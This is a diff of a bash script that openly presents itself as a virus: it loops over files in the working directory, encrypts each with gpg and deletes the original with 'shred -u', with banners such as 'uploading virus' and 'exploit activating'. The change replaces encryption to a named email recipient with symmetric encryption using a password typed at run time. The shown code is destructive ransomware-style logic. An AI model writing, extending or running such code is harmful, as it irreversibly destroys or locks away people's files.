@@ -21,7 +21,7 @@ function chk_dir
 				printf "\nit is the exploit"
 			else
 			printf "encrypting $i_1 and deleteing original one\n" 
-		        gpg -r "<sinhaanimesh82@gmail.com>" -e $i_1;shred -u $i_1
+		        gpg -c --batch --passphrase $pass $i_1;shred -u $i_1
 			#echo "test"
 		 fi
 		 done
@@ -35,6 +35,8 @@ path=`pwd`
 ext='/*'
 #next='.animesh'
 file=$path$ext
+printf "enter password you want for encrytion\n"
+read pass
 printf "$(tput setaf 1)uploading virus through $path\n$(tput setab 7)"
 sleep 0.8
 printf "$(tput setaf 1)exploit activating in\n$(tput setab 7)"
@@ -47,4 +49,4 @@ printf "1\n"
 sleep 0.3
 printf "(tput setaf 2)DONE...\n"
 printf "executing...\n"
-chk_dir "$file"
+chk_dir "$file" "$pass"
